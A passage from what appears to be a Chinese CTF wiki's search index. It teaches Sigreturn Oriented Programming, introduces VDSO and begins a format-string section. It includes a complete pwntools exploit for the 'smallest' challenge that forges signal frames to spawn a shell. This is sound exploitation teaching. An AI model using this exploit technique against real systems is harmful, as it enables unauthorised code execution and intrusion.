            "text": "SROP(Sigreturn Oriented Programming)\u4e8e2014\u5e74\u88abVrije Universiteit Amsterdam\u7684Erik Bosman\u63d0\u51fa\uff0c\u5176\u76f8\u5173\u7814\u7a76 Framing Signals \u2014 A Return to Portable Shellcode \u53d1\u8868\u5728\u5b89\u5168\u9876\u7ea7\u4f1a\u8bae Oakland 2014 \u4e0a\uff0c\u88ab\u8bc4\u9009\u4e3a\u5f53\u5e74\u7684 Best Student Papers \u3002\u5176\u4e2d\u76f8\u5173\u7684paper\u4ee5\u53caslides\u7684\u94fe\u63a5\u5982\u4e0b\uff1a  paper  slides  \u5176\u4e2d\uff0c sigreturn \u662f\u4e00\u4e2a\u7cfb\u7edf\u8c03\u7528\uff0c\u5728\u7c7bunix\u7cfb\u7edf\u53d1\u751fsignal\u7684\u65f6\u5019\u4f1a\u88ab\u95f4\u63a5\u5730\u8c03\u7528\u3002", 
            "title": "\u57fa\u672c\u4ecb\u7ecd"
        }, 
        {
            "location": "/pwn/stackoverflow/advanced_rop/#signal", 
            "text": "signal\u673a\u5236\u662f\u7c7bunix\u7cfb\u7edf\u4e2d\u8fdb\u7a0b\u4e4b\u95f4\u76f8\u4e92\u4f20\u9012\u4fe1\u606f\u7684\u4e00\u79cd\u65b9\u6cd5\u3002\u4e00\u822c\uff0c\u6211\u4eec\u4e5f\u79f0\u5176\u4e3a\u8f6f\u4e2d\u65ad\u4fe1\u53f7\uff0c\u6216\u8005\u8f6f\u4e2d\u65ad\u3002\u6bd4\u5982\u8bf4\uff0c\u8fdb\u7a0b\u4e4b\u95f4\u53ef\u4ee5\u901a\u8fc7\u7cfb\u7edf\u8c03\u7528kill\u6765\u53d1\u9001\u8f6f\u4e2d\u65ad\u4fe1\u53f7\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u4fe1\u53f7\u673a\u5236\u5e38\u89c1\u7684\u6b65\u9aa4\u5982\u4e0b\u56fe\u6240\u793a\uff1a     \u5185\u6838\u5411\u67d0\u4e2a\u8fdb\u7a0b\u53d1\u9001signal\u673a\u5236\uff0c\u8be5\u8fdb\u7a0b\u4f1a\u88ab\u6682\u65f6\u6302\u8d77\uff0c\u8fdb\u5165\u5185\u6838\u6001\u3002    \u5185\u6838\u4f1a\u4e3a\u8be5\u8fdb\u7a0b\u4fdd\u5b58\u76f8\u5e94\u7684\u4e0a\u4e0b\u6587\uff0c \u4e3b\u8981\u662f\u5c06\u6240\u6709\u5bc4\u5b58\u5668\u538b\u5165\u6808\u4e2d\uff0c\u4ee5\u53ca\u538b\u5165signal\u4fe1\u606f\uff0c\u4ee5\u53ca\u6307\u5411sigreturn\u7684\u7cfb\u7edf\u8c03\u7528\u5730\u5740 \u3002\u6b64\u65f6\u6808\u7684\u7ed3\u6784\u5982\u4e0b\u56fe\u6240\u793a\uff0c\u6211\u4eec\u79f0ucontext\u4ee5\u53casiginfo\u8fd9\u4e00\u6bb5\u4e3aSignal Frame\u3002 \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u8fd9\u4e00\u90e8\u5206\u662f\u5728\u7528\u6237\u8fdb\u7a0b\u7684\u5730\u5740\u7a7a\u95f4\u7684\u3002 \u4e4b\u540e\u4f1a\u8df3\u8f6c\u5230\u6ce8\u518c\u8fc7\u7684signal handler\u4e2d\u5904\u7406\u76f8\u5e94\u7684signal\u3002\u56e0\u6b64\uff0c\u5f53signal handler\u6267\u884c\u5b8c\u4e4b\u540e\uff0c\u5c31\u4f1a\u6267\u884csigreturn\u4ee3\u7801\u3002   \u5bf9\u4e8esignal Frame\u6765\u8bf4\uff0c\u4e0d\u540c\u4f1a\u56e0\u4e3a\u67b6\u6784\u7684\u4e0d\u540c\u800c\u56e0\u6b64\u6709\u6240\u533a\u522b\uff0c\u8fd9\u91cc\u7ed9\u51fa\u5206\u522b\u7ed9\u51fax86\u4ee5\u53cax64\u7684sigcontext   x86   struct   sigcontext  { \n   unsigned   short   gs ,   __gsh ; \n   unsigned   short   fs ,   __fsh ; \n   unsigned   short   es ,   __esh ; \n   unsigned   short   ds ,   __dsh ; \n   unsigned   long   edi ; \n   unsigned   long   esi ; \n   unsigned   long   ebp ; \n   unsigned   long   esp ; \n   unsigned   long   ebx ; \n   unsigned   long   edx ; \n   unsigned   long   ecx ; \n   unsigned   long   eax ; \n   unsigned   long   trapno ; \n   unsigned   long   err ; \n   unsigned   long   eip ; \n   unsigned   short   cs ,   __csh ; \n   unsigned   long   eflags ; \n   unsigned   long   esp_at_signal ; \n   unsigned   short   ss ,   __ssh ; \n   struct   _fpstate   *   fpstate ; \n   unsigned   long   oldmask ; \n   unsigned   long   cr2 ;  };    x64   struct   _fpstate  { \n   /* FPU environment matching the 64-bit FXSAVE layout.  */ \n   __uint16_t          cwd ; \n   __uint16_t          swd ; \n   __uint16_t          ftw ; \n   __uint16_t          fop ; \n   __uint64_t          rip ; \n   __uint64_t          rdp ; \n   __uint32_t          mxcsr ; \n   __uint32_t          mxcr_mask ; \n   struct   _fpxreg      _st [ 8 ]; \n   struct   _xmmreg      _xmm [ 16 ]; \n   __uint32_t          padding [ 24 ];  };  struct   sigcontext  { \n   __uint64_t   r8 ; \n   __uint64_t   r9 ; \n   __uint64_t   r10 ; \n   __uint64_t   r11 ; \n   __uint64_t   r12 ; \n   __uint64_t   r13 ; \n   __uint64_t   r14 ; \n   __uint64_t   r15 ; \n   __uint64_t   rdi ; \n   __uint64_t   rsi ; \n   __uint64_t   rbp ; \n   __uint64_t   rbx ; \n   __uint64_t   rdx ; \n   __uint64_t   rax ; \n   __uint64_t   rcx ; \n   __uint64_t   rsp ; \n   __uint64_t   rip ; \n   __uint64_t   eflags ; \n   unsigned   short   cs ; \n   unsigned   short   gs ; \n   unsigned   short   fs ; \n   unsigned   short   __pad0 ; \n   __uint64_t   err ; \n   __uint64_t   trapno ; \n   __uint64_t   oldmask ; \n   __uint64_t   cr2 ; \n   __extension__   union \n     { \n       struct   _fpstate   *   fpstate ; \n       __uint64_t   __fpstate_word ; \n     }; \n   __uint64_t   __reserved1   [ 8 ];  };     signal handler\u8fd4\u56de\u540e\uff0c\u5185\u6838\u4e3a\u6267\u884csigreturn\u7cfb\u7edf\u8c03\u7528\uff0c\u4e3a\u8be5\u8fdb\u7a0b\u6062\u590d\u4e4b\u524d\u4fdd\u5b58\u7684\u4e0a\u4e0b\u6587\uff0c\u5176\u4e2d\u5305\u62ec\u5c06\u6240\u6709\u538b\u5165\u7684\u5bc4\u5b58\u5668\uff0c\u91cd\u65b0pop\u56de\u5bf9\u5e94\u7684\u5bc4\u5b58\u5668\uff0c\u6700\u540e\u6062\u590d\u8fdb\u7a0b\u7684\u6267\u884c\u3002\u5176\u4e2d\uff0c32\u4f4d\u7684sigreturn\u7684\u8c03\u7528\u53f7\u4e3a77\uff0c64\u4f4d\u7684\u7cfb\u7edf\u8c03\u7528\u53f7\u4e3a15\u3002", 
            "title": "signal\u673a\u5236"
        }, 
        {
            "location": "/pwn/stackoverflow/advanced_rop/#_8", 
            "text": "\u4ed4\u7ec6\u56de\u987e\u4e00\u4e0b\u5185\u6838\u5728signal\u4fe1\u53f7\u5904\u7406\u7684\u8fc7\u7a0b\u4e2d\u7684\u5de5\u4f5c\uff0c\u6211\u4eec\u53ef\u4ee5\u53d1\u73b0\uff0c\u5185\u6838\u4e3b\u8981\u505a\u7684\u5de5\u4f5c\u5c31\u662f\u4e3a\u8fdb\u7a0b\u4fdd\u5b58\u4e0a\u4e0b\u6587\uff0c\u5e76\u4e14\u6062\u590d\u4e0a\u4e0b\u6587\u3002\u8fd9\u4e2a\u4e3b\u8981\u7684\u53d8\u52a8\u90fd\u5728Signal Frame\u4e2d\u3002\u4f46\u662f\u9700\u8981\u6ce8\u610f\u7684\u662f\uff1a   Signal Frame\u88ab\u4fdd\u5b58\u5728\u7528\u6237\u7684\u5730\u5740\u7a7a\u95f4\u4e2d\uff0c\u6240\u4ee5\u7528\u6237\u662f\u53ef\u4ee5\u8bfb\u5199\u7684\u3002  \u7531\u4e8e\u5185\u6838\u4e0e\u4fe1\u53f7\u5904\u7406\u7a0b\u5e8f\u65e0\u5173(kernel agnostic about signal handlers)\uff0c\u5b83\u5e76\u4e0d\u4f1a\u53bb\u8bb0\u5f55\u8fd9\u4e2asignal\u5bf9\u5e94\u7684Signal Frame\uff0c\u6240\u4ee5\u5f53\u6267\u884csigreturn\u7cfb\u7edf\u8c03\u7528\u65f6\uff0c\u6b64\u65f6\u7684Signal Frame\u5e76\u4e0d\u4e00\u5b9a\u662f\u4e4b\u524d\u5185\u6838\u4e3a\u7528\u6237\u8fdb\u7a0b\u4fdd\u5b58\u7684Signal Frame\u3002   \u8bf4\u5230\u8fd9\u91cc\uff0c\u5176\u5b9e\uff0cSROP\u7684\u57fa\u672c\u5229\u7528\u539f\u7406\u4e5f\u5c31\u51fa\u73b0\u4e86\u3002\u4e0b\u9762\u4e3e\u4e24\u4e2a\u7b80\u5355\u7684\u4f8b\u5b50\u3002", 
            "title": "\u653b\u51fb\u539f\u7406"
        }, 
        {
            "location": "/pwn/stackoverflow/advanced_rop/#shell", 
            "text": "\u9996\u5148\uff0c\u6211\u4eec\u5047\u8bbe\u653b\u51fb\u8005\u53ef\u4ee5\u63a7\u5236\u7528\u6237\u8fdb\u7a0b\u7684\u6808\uff0c\u90a3\u4e48\u5b83\u5c31\u53ef\u4ee5\u4f2a\u9020\u4e00\u4e2aSignal Frame\uff0c\u5982\u4e0b\u56fe\u6240\u793a\uff0c\u8fd9\u91cc\u4ee564\u4f4d\u4e3a\u4f8b\u5b50\uff0c\u7ed9\u51faSignal Frame\u66f4\u52a0\u8be6\u7ec6\u7684\u4fe1\u606f   \u5f53\u7cfb\u7edf\u6267\u884c\u5b8csigreturn\u7cfb\u7edf\u8c03\u7528\u4e4b\u540e\uff0c\u4f1a\u6267\u884c\u4e00\u7cfb\u5217\u7684pop\u6307\u4ee4\u4ee5\u4fbf\u4e8e\u6062\u590d\u76f8\u5e94\u5bc4\u5b58\u5668\u7684\u503c\uff0c\u5f53\u6267\u884c\u5230rip\u65f6\uff0c\u5c31\u4f1a\u5c06\u7a0b\u5e8f\u6267\u884c\u6d41\u6307\u5411syscall\u5730\u5740\uff0c\u6839\u636e\u76f8\u5e94\u5bc4\u5b58\u5668\u7684\u503c\uff0c\u6b64\u65f6\uff0c\u4fbf\u4f1a\u5f97\u5230\u4e00\u4e2ashell\u3002", 
            "title": "\u83b7\u53d6shell"
        }, 
        {
            "location": "/pwn/stackoverflow/advanced_rop/#system-call-chains", 
            "text": "\u9700\u8981\u6307\u51fa\u7684\u662f\uff0c\u4e0a\u9762\u7684\u4f8b\u5b50\u4e2d\uff0c\u6211\u4eec\u53ea\u662f\u5355\u72ec\u7684\u83b7\u5f97\u4e00\u4e2ashell\u3002\u6709\u65f6\u5019\uff0c\u6211\u4eec\u53ef\u80fd\u4f1a\u5e0c\u671b\u6267\u884c\u4e00\u7cfb\u5217\u7684\u51fd\u6570\u3002\u6211\u4eec\u53ea\u9700\u8981\u505a\u4e24\u5904\u4fee\u6539\u5373\u53ef   \u63a7\u5236\u6808\u6307\u9488\u3002  \u628a\u539f\u6765rip\u6307\u5411\u7684 syscall  gadget\u6362\u6210 syscall; ret  gadget\u3002   \u5982\u4e0b\u56fe\u6240\u793a \uff0c\u8fd9\u6837\u5f53\u6bcf\u6b21syscall\u8fd4\u56de\u7684\u65f6\u5019\uff0c\u6808\u6307\u9488\u90fd\u4f1a\u6307\u5411\u4e0b\u4e00\u4e2aSignal Frame\u3002\u56e0\u6b64\u5c31\u53ef\u4ee5\u6267\u884c\u4e00\u7cfb\u5217\u7684sigreturn\u51fd\u6570\u8c03\u7528\u3002", 
            "title": "system call chains"
        }, 
        {
            "location": "/pwn/stackoverflow/advanced_rop/#_9", 
            "text": "\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u6211\u4eec\u5728\u6784\u9020ROP\u653b\u51fb\u7684\u65f6\u5019\uff0c\u9700\u8981\u6ee1\u8db3\u4e0b\u9762\u7684\u6761\u4ef6   \u53ef\u4ee5\u901a\u8fc7\u6808\u6ea2\u51fa\u6765\u63a7\u5236\u6808\u7684\u5185\u5bb9  \u9700\u8981\u77e5\u9053\u76f8\u5e94\u7684\u5730\u5740  \"/bin/sh\"  Signal Frame  syscal  sigreturn    \u9700\u8981\u6709\u591f\u5927\u7684\u7a7a\u95f4\u6765\u585e\u4e0b\u6574\u4e2asigal frame   \u6b64\u5916\uff0c\u5173\u4e8esigreturn\u4ee5\u53casyscall;ret\u8fd9\u4e24\u4e2agadget\u5728\u4e0a\u9762\u5e76\u6ca1\u6709\u63d0\u53ca\u3002\u63d0\u51fa\u8be5\u653b\u51fb\u7684\u8bba\u6587\u4f5c\u8005\u53d1\u73b0\u4e86\u8fd9\u4e9bgadgets\u51fa\u73b0\u7684\u67d0\u4e9b\u5730\u5740\uff1a   \u5e76\u4e14\uff0c\u4f5c\u8005\u53d1\u73b0\uff0c\u6709\u4e9b\u7cfb\u7edf\u4e0aSROP\u7684\u5730\u5740\u88ab\u968f\u673a\u5316\u4e86\uff0c\u800c\u6709\u4e9b\u5219\u6ca1\u6709\u3002\u6bd4\u5982\u8bf4 Linux   3.3 x86_64 \uff08\u5728Debian 7.0\uff0c Ubuntu Long Term Support\uff0c CentOS 6\u7cfb\u7edf\u4e2d\u9ed8\u8ba4\u5185\u6838\uff09\uff0c\u53ef\u4ee5\u76f4\u63a5\u5728vsyscall\u4e2d\u7684\u56fa\u5b9a\u5730\u5740\u5904\u627e\u5230syscall return\u4ee3\u7801\u7247\u6bb5\u3002\u5982\u4e0b   \u4f46\u662f\u76ee\u524d\u5b83\u5df2\u7ecf\u88ab vsyscall-emulate \u548c vdso \u673a\u5236\u4ee3\u66ff\u4e86\u3002\u6b64\u5916\uff0c\u76ee\u524d\u5927\u591a\u6570\u7cfb\u7edf\u90fd\u4f1a\u5f00\u542fASLR\u4fdd\u62a4\uff0c\u6240\u4ee5\u76f8\u5bf9\u6765\u8bf4\u8fd9\u4e9bgadgets\u90fd\u5e76\u4e0d\u5bb9\u6613\u627e\u5230\u3002  \u503c\u5f97\u4e00\u8bf4\u7684\u662f\uff0c\u5bf9\u4e8esigreturn\u7cfb\u7edf\u8c03\u7528\u6765\u8bf4\uff0c\u572864\u4f4d\u7cfb\u7edf\u4e2d\uff0csigreturn\u7cfb\u7edf\u8c03\u7528\u5bf9\u5e94\u7684\u7cfb\u7edf\u8c03\u7528\u53f7\u4e3a15\uff0c\u53ea\u9700\u8981RAX=15\uff0c\u5e76\u4e14\u6267\u884csyscall\u5373\u53ef\u5b9e\u73b0\u8c03\u7528syscall\u8c03\u7528\u3002\u800cRAX\u5bc4\u5b58\u5668\u7684\u503c\u53c8\u53ef\u4ee5\u901a\u8fc7\u63a7\u5236\u67d0\u4e2a\u51fd\u6570\u7684\u8fd4\u56de\u503c\u6765\u95f4\u63a5\u63a7\u5236\uff0c\u6bd4\u5982\u8bf4read\u51fd\u6570\u7684\u8fd4\u56de\u503c\u4e3a\u8bfb\u53d6\u7684\u5b57\u8282\u6570\u3002", 
            "title": "\u540e\u7eed"
        }, 
        {
            "location": "/pwn/stackoverflow/advanced_rop/#_10", 
            "text": "\u503c\u5f97\u4e00\u63d0\u7684\u662f\uff0c\u5728\u76ee\u524d\u7684pwntools\u4e2d\u5df2\u7ecf\u96c6\u6210\u4e86\u5bf9\u4e8esrop\u7684\u653b\u51fb\u3002", 
            "title": "\u5229\u7528\u5de5\u5177"
        }, 
        {
            "location": "/pwn/stackoverflow/advanced_rop/#_11", 
            "text": "\u8fd9\u91cc\u4ee5360\u6625\u79cb\u676f\u4e2d\u7684smallest-pwn\u4e3a\u4f8b\u8fdb\u884c\u7b80\u5355\u4ecb\u7ecd\u3002\u57fa\u672c\u6b65\u9aa4\u5982\u4e0b  \u786e\u5b9a\u6587\u4ef6\u57fa\u672c\u4fe1\u606f  \u279c  smallest file smallest     \nsmallest: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, stripped  \u53ef\u4ee5\u770b\u5230\u8be5\u7a0b\u5e8f\u4e3a64\u4f4d\u9759\u6001\u94fe\u63a5\u7248\u672c\u3002  \u68c0\u67e5\u4fdd\u62a4  \u279c  smallest checksec smallest     \n    Arch:     amd64-64-little\n    RELRO:    No RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE (0x400000)  \u7a0b\u5e8f\u4e3b\u8981\u5f00\u542f\u4e86NX\u4fdd\u62a4\u3002  \u6f0f\u6d1e\u53d1\u73b0  \u5b9e\u7528IDA\u76f4\u63a5\u53cd\u7f16\u8bd1\u770b\u4e86\u4e00\u4e0b\uff0c\u53d1\u73b0\u7a0b\u5e8f\u5c31\u51e0\u884c\u6c47\u7f16\u4ee3\u7801\uff0c\u5982\u4e0b  public   start  start   proc   near  xor       rax ,   rax  mov       edx ,   400 h  mov       rsi ,   rsp  mov       rdi ,   rax  syscall  retn  start   endp   \u6839\u636esyscall\u7684\u7f16\u53f7\u4e3a0\uff0c\u53ef\u4ee5\u77e5\u9053\u6539\u7a0b\u5e8f\u6267\u884c\u7684\u6307\u4ee4\u4e3aread(0,$rsp,400)\uff0c\u5373\u5411\u6808\u9876\u8bfb\u5165400\u4e2a\u5b57\u7b26\u3002\u6beb\u65e0\u7591\u95ee\uff0c\u8fd9\u4e2a\u662f\u6709\u6808\u6ea2\u51fa\u7684\u3002  \u5229\u7528\u601d\u8def  \u7531\u4e8e\u7a0b\u5e8f\u4e2d\u5e76\u6ca1\u6709sigreturn\u8c03\u7528\uff0c\u6240\u4ee5\u6211\u4eec\u5f97\u81ea\u5df1\u6784\u9020\uff0c\u6b63\u597d\u8fd9\u91cc\u6709read\u51fd\u6570\u8c03\u7528\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7read\u51fd\u6570\u8bfb\u53d6\u7684\u5b57\u8282\u6570\u6765\u8bbe\u7f6erax\u7684\u503c\u3002\u91cd\u8981\u601d\u8def\u5982\u4e0b   \u901a\u8fc7\u63a7\u5236read\u8bfb\u53d6\u7684\u5b57\u7b26\u6570\u6765\u8bbe\u7f6eRAX\u5bc4\u5b58\u5668\u7684\u503c\uff0c\u4ece\u800c\u6267\u884csigreturn  \u901a\u8fc7syscall\u6267\u884cexecve(\"/bin/sh\",0,0)\u6765\u83b7\u53d6shell\u3002   \u6f0f\u6d1e\u5229\u7528\u7a0b\u5e8f  from   pwn   import   *  from   LibcSearcher   import   *  small   =   ELF ( ./smallest )  if   args [ REMOTE ]: \n     sh   =   remote ( 127.0.0.1 ,   7777 )  else : \n     sh   =   process ( ./smallest )  context . arch   =   amd64  context . log_level   =   debug  syscall_ret   =   0x00000000004000BE  start_addr   =   0x00000000004000B0  ## set start addr three times  payload   =   p64 ( start_addr )   *   3  sh . send ( payload )  ## modify the return addr to start_addr+3  ## so that skip the xor rax,rax; then the rax=1  ## get stack addr  sh . send ( \\xb3 )  stack_addr   =   u64 ( sh . recv ()[ 8 : 16 ])  log . success ( leak stack addr :   +   hex ( stack_addr ))  ## make the rsp point to stack_addr  ## the frame is read(0,stack_addr,0x400)  sigframe   =   SigreturnFrame ()  sigframe . rax   =   constants . SYS_read  sigframe . rdi   =   0  sigframe . rsi   =   stack_addr  sigframe . rdx   =   0x400  sigframe . rsp   =   stack_addr  sigframe . rip   =   syscall_ret  payload   =   p64 ( start_addr )   +   a   *   8   +   str ( sigframe )  sh . send ( payload )  ## set rax=15 and call sigreturn  sigreturn   =   p64 ( syscall_ret )   +   b   *   7  sh . send ( sigreturn )  ## call execv( /bin/sh ,0,0)  sigframe   =   SigreturnFrame ()  sigframe . rax   =   constants . SYS_execve  sigframe . rdi   =   stack_addr   +   0x120    #  /bin/sh   s addr  sigframe . rsi   =   0x0  sigframe . rdx   =   0x0  sigframe . rsp   =   stack_addr  sigframe . rip   =   syscall_ret  frame_payload   =   p64 ( start_addr )   +   b   *   8   +   str ( sigframe )  print   len ( frame_payload )  payload   =   frame_payload   +   ( 0x120   -   len ( frame_payload ))   *   \\x00   +   /bin/sh \\x00  sh . send ( payload )  sh . send ( sigreturn )  sh . interactive ()   \u5176\u57fa\u672c\u6d41\u7a0b\u4e3a   \u8bfb\u53d6\u4e09\u4e2a\u7a0b\u5e8f\u8d77\u59cb\u5730\u5740  \u7a0b\u5e8f\u8fd4\u56de\u65f6\uff0c\u5229\u7528\u7b2c\u4e00\u4e2a\u7a0b\u5e8f\u8d77\u59cb\u5730\u5740\u8bfb\u53d6\u5730\u5740\uff0c\u4fee\u6539\u8fd4\u56de\u5730\u5740(\u5373\u7b2c\u4e8c\u4e2a\u7a0b\u5e8f\u8d77\u59cb\u5730\u5740)\u4e3a\u6e90\u7a0b\u5e8f\u7684\u7b2c\u4e8c\u6761\u6307\u4ee4\uff0c\u5e76\u4e14\u4f1a\u8bbe\u7f6erax=1  \u90a3\u4e48\u6b64\u65f6\u5c06\u4f1a\u6267\u884cwrite(1,$esp,0x400)\uff0c\u6cc4\u9732\u6808\u5730\u5740\u3002  \u5229\u7528\u7b2c\u4e09\u4e2a\u7a0b\u5e8f\u8d77\u59cb\u5730\u5740\u8fdb\u800c\u8bfb\u5165payload  \u518d\u6b21\u8bfb\u53d6\u6784\u9020sigreturn\u8c03\u7528\uff0c\u8fdb\u800c\u5c06\u5411\u6808\u5730\u5740\u6240\u5728\u4f4d\u7f6e\u8bfb\u5165\u6570\u636e\uff0c\u6784\u9020execve('/bin/sh',0,0)  \u518d\u6b21\u8bfb\u53d6\u6784\u9020sigreturn\u8c03\u7528\uff0c\u4ece\u800c\u83b7\u53d6shell\u3002", 
            "title": "\u793a\u4f8b"
        }, 
        {
            "location": "/pwn/stackoverflow/advanced_rop/#_12", 
            "text": "Defcon 2015 Qualifier: fuckup   \u53c2\u8003\u9605\u8bfb   Sigreturn Oriented Programming (SROP) Attack\u653b\u51fb\u539f\u7406  SROP by Angle Baby  \u7cfb\u7edf\u8c03\u7528", 
            "title": "\u9898\u76ee"
        }, 
        {
            "location": "/pwn/stackoverflow/advanced_rop/#ret2vdso", 
            "text": "", 
            "title": "ret2VDSO"
        }, 
        {
            "location": "/pwn/stackoverflow/advanced_rop/#vdso", 
            "text": "\u4ec0\u4e48\u662fVDSO(Virtual Dynamically-linked Shared Object)\u5462\uff1f\u542c\u5176\u540d\u5b57\uff0c\u5927\u6982\u662f\u865a\u62df\u52a8\u6001\u94fe\u63a5\u5171\u4eab\u5bf9\u8c61\uff0c\u6240\u4ee5\u8bf4\u5b83\u5e94\u8be5\u662f\u865a\u62df\u7684\uff0c\u4e0e\u865a\u62df\u5185\u5b58\u4e00\u76f4\uff0c\u5728\u8ba1\u7b97\u673a\u4e2d\u672c\u8eab\u5e76\u4e0d\u5b58\u5728\u3002\u5177\u4f53\u6765\u8bf4\uff0c\u5b83\u662f\u5c06\u5185\u6838\u6001\u7684\u8c03\u7528\u6620\u5c04\u5230\u7528\u6237\u5730\u5740\u7a7a\u95f4\u7684\u5e93\u3002\u90a3\u4e48\u5b83\u4e3a\u4ec0\u4e48\u4f1a\u5b58\u5728\u5462\uff1f\u8fd9\u662f\u56e0\u4e3a\u6709\u4e9b\u7cfb\u7edf\u8c03\u7528\u7ecf\u5e38\u88ab\u7528\u6237\u4f7f\u7528\uff0c\u8fd9\u5c31\u4f1a\u51fa\u73b0\u5927\u91cf\u7684\u7528\u6237\u6001\u4e0e\u5185\u6838\u6001\u5207\u6362\u7684\u5f00\u9500\u3002\u901a\u8fc7vdso\uff0c\u6211\u4eec\u53ef\u4ee5\u5927\u91cf\u51cf\u5c11\u8fd9\u6837\u7684\u5f00\u9500\uff0c\u540c\u65f6\u4e5f\u53ef\u4ee5\u4f7f\u5f97\u6211\u4eec\u7684\u8def\u5f84\u66f4\u597d\u3002\u8fd9\u91cc\u8def\u5f84\u66f4\u597d\u6307\u7684\u662f\uff0c\u6211\u4eec\u4e0d\u9700\u8981\u4f7f\u7528\u4f20\u7edf\u7684int 0x80\u6765\u8fdb\u884c\u7cfb\u7edf\u8c03\u7528\uff0c\u4e0d\u540c\u7684\u5904\u7406\u5668\u5b9e\u73b0\u4e86\u4e0d\u540c\u7684\u5feb\u901f\u7cfb\u7edf\u8c03\u7528\u6307\u4ee4   intel\u5b9e\u73b0\u4e86sysenter\uff0csysexit  amd\u5b9e\u73b0\u4e86syscall\uff0csysret   \u5f53\u4e0d\u540c\u7684\u5904\u7406\u5668\u67b6\u6784\u5b9e\u73b0\u4e86\u4e0d\u540c\u7684\u6307\u4ee4\u65f6\uff0c\u81ea\u7136\u5c31\u4f1a\u51fa\u73b0\u517c\u5bb9\u6027\u95ee\u9898\uff0c\u6240\u4ee5linux\u5b9e\u73b0\u4e86vsyscall\u63a5\u53e3\uff0c\u5728\u5e95\u5c42\u4f1a\u6839\u636e\u5177\u4f53\u7684\u7ed3\u6784\u6765\u8fdb\u884c\u5177\u4f53\u64cd\u4f5c\u3002\u800cvsyscall\u5c31\u5b9e\u73b0\u5728vdso\u4e2d\u3002  \u8fd9\u91cc\uff0c\u6211\u4eec\u987a\u4fbf\u6765\u770b\u4e00\u4e0bvdso\uff0c\u5728Linux(kernel 2.6 or upper)\u4e2d\u6267\u884cldd /bin/sh, \u4f1a\u53d1\u73b0\u6709\u4e2a\u540d\u5b57\u53eblinux-vdso.so.1(\u8001\u70b9\u7684\u7248\u672c\u662flinux-gate.so.1)\u7684\u52a8\u6001\u6587\u4ef6, \u800c\u7cfb\u7edf\u4e2d\u5374\u627e\u4e0d\u5230\u5b83, \u5b83\u5c31\u662fVDSO\u3002 \u4f8b\u5982:  \u279c  ~ ldd /bin/sh           \n    linux-vdso.so.1  =    ( 0x00007ffd8ebf2000 ) \n    libc.so.6  =  /lib/x86_64-linux-gnu/libc.so.6  ( 0x00007f84ff2f9000 ) \n    /lib64/ld-linux-x86-64.so.2  ( 0x0000560cae6eb000 )   \u9664\u4e86\u5feb\u901f\u7cfb\u7edf\u8c03\u7528\uff0cglibc\u4e5f\u63d0\u4f9b\u4e86VDSO\u7684\u652f\u6301, open(), read(), write(), gettimeofday()\u90fd\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528VDSO\u4e2d\u7684\u5b9e\u73b0\u3002\u4f7f\u5f97\u8fd9\u4e9b\u8c03\u7528\u901f\u5ea6\u66f4\u5feb\u3002 \u5185\u6838\u65b0\u7279\u6027\u5728\u4e0d\u5f71\u54cdglibc\u7684\u60c5\u51b5\u4e0b\u4e5f\u53ef\u4ee5\u66f4\u5feb\u7684\u90e8\u7f72\u3002  \u8fd9\u91cc\u6211\u4eec\u4ee5intel\u7684\u5904\u7406\u5668\u4e3a\u4f8b\uff0c\u8fdb\u884c\u7b80\u5355\u8bf4\u660e\u3002  \u5176\u4e2dsysenter\u7684\u53c2\u6570\u4f20\u9012\u65b9\u5f0f\u4e0eint 0x80\u4e00\u81f4\uff0c\u4f46\u662f\u6211\u4eec\u53ef\u80fd\u9700\u8981\u81ea\u5df1\u5e03\u7f6e\u597d function prolog\uff0832\u4f4d\u4e3a\u4f8b\uff09  push   ebp  mov   ebp , esp   \u6b64\u5916\uff0c\u5982\u679c\u6211\u4eec\u6ca1\u6709\u63d0\u4f9bfuncttion prolog\u7684\u8bdd\uff0c\u6211\u4eec\u8fd8\u9700\u8981\u4e00\u4e2a\u53ef\u4ee5\u8fdb\u884c\u6808\u8fc1\u79fb\u7684gadgets\uff0c\u4ee5\u4fbf\u4e8e\u53ef\u4ee5\u6539\u53d8\u6808\u7684\u4f4d\u7f6e\u3002", 
            "title": "VDSO\u4ecb\u7ecd"
        }, 
        {
            "location": "/pwn/stackoverflow/advanced_rop/#_13", 
            "text": "\u5f85\u8865\u5145\u3002", 
            "title": "\u539f\u7406"
        }, 
        {
            "location": "/pwn/stackoverflow/advanced_rop/#_14", 
            "text": "Defcon 2015 Qualifier fuckup   \u53c2\u8003   http://man7.org/linux/man-pages/man7/vdso.7.html  http://adam8157.info/blog/2011/10/linux-vdso/", 
            "title": "\u9898\u76ee"
        }, 
        {
            "location": "/pwn/stackoverflow/advanced_rop/#jop", 
            "text": "Jump-oriented programming", 
            "title": "JOP"
        }, 
        {
            "location": "/pwn/stackoverflow/advanced_rop/#cop", 
            "text": "Call-oriented programming", 
            "title": "COP"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_intro/", 
            "text": "\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u539f\u7406\u4ecb\u7ecd\n\n\n\u9996\u5148\uff0c\u5bf9\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u7684\u539f\u7406\u8fdb\u884c\u7b80\u5355\u4ecb\u7ecd\u3002\n\n\n\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u51fd\u6570\u4ecb\u7ecd\n\n\n\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u51fd\u6570\u53ef\u4ee5\u63a5\u53d7\u53ef\u53d8\u6570\u91cf\u7684\u53c2\u6570\uff0c\u5e76\u5c06\n\u7b2c\u4e00\u4e2a\u53c2\u6570\u4f5c\u4e3a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\uff0c\u6839\u636e\u5176\u6765\u89e3\u6790\u4e4b\u540e\u7684\u53c2\u6570\n\u3002\u901a\u4fd7\u6765\u8bf4\uff0c\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u51fd\u6570\u5c31\u662f\u5c06\u8ba1\u7b97\u673a\u5185\u5b58\u4e2d\u8868\u793a\u7684\u6570\u636e\u8f6c\u5316\u4e3a\u6211\u4eec\u4eba\u7c7b\u53ef\u8bfb\u7684\u5b57\u7b26\u4e32\u683c\u